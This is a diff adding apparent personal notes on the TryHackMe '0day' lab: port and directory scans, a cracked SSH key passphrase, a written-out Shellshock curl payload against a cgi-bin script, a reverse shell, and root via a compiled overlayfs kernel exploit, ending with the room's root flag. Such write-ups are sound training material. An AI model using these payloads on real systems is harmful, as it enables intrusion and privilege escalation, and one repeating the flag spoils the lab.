@@ -1,0 +1,73 @@
+10.10.42.151 : 0day : tryhackme
+
+ports
+------
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+gobuster-initial
+----------------
+/.hta                 (Status: 403) [Size: 283]
+/.htaccess            (Status: 403) [Size: 288]
+/.htpasswd            (Status: 403) [Size: 288]
+/admin                (Status: 301) [Size: 311] [--> http://10.10.42.151/admin/]
+/backup               (Status: 301) [Size: 312] [--> http://10.10.42.151/backup/]
+/cgi-bin              (Status: 301) [Size: 313] [--> http://10.10.42.151/cgi-bin/]
+/cgi-bin/             (Status: 403) [Size: 287]
+/css                  (Status: 301) [Size: 309] [--> http://10.10.42.151/css/]
+/img                  (Status: 301) [Size: 309] [--> http://10.10.42.151/img/]
+/index.html           (Status: 200) [Size: 3025]
+/js                   (Status: 301) [Size: 308] [--> http://10.10.42.151/js/]
+/robots.txt           (Status: 200) [Size: 38]
+/secret               (Status: 301) [Size: 312] [--> http://10.10.42.151/secret/]
+/server-status        (Status: 403) [Size: 292]
+/uploads              (Status: 301) [Size: 313] [--> http://10.10.42.151/uploads/]
+
+* found an encrypted rsa-private key in the backup
+* cracking it with ssh2john gives credential : letmein 
+
+ssh
+----
+ryan ? : letmein --> no scope
+
+* finding more about the cgi-bin and understood that the machine is vulnerable to shellshock vulnerability 
+curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" "http://10.10.187.137/cgi-bin/test.cgi"
+
+* the above command is basically a RCE and injecting a bash reverse shell into the machine and setting up a netcat listener we were able to get www-data
+
+* another way to get a shell is through metasploit , search for shellshoch ans choose the most appropriate exploit 
+* set the options and run 
+* we have www-data 
+* can read the user.txt from /home/ryan/user.txt
+
+priv-esc
+---------
+* uploading linpeas.sh onto /tmp and running it will provide us with the old version of the linux kernal
+* 3.13.0-32-generic 
+* searching for a possible exloit in searchsploit and found a exploit 
+* 37292.c in searchsploit
+* searchsploit -m 37292.c
+
+www-data@ubuntu:/tmp$ gcc 37292.c -o ofs
+gcc 37292.c -o ofs
+www-data@ubuntu:/tmp$ ls
+ls
+37292.c
+lin.log
+linpeas.sh
+ofs
+www-data@ubuntu:/tmp$ ./ofs
+./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+THM{g00d_j0b_0day_is_Pleased}
+# 
+  
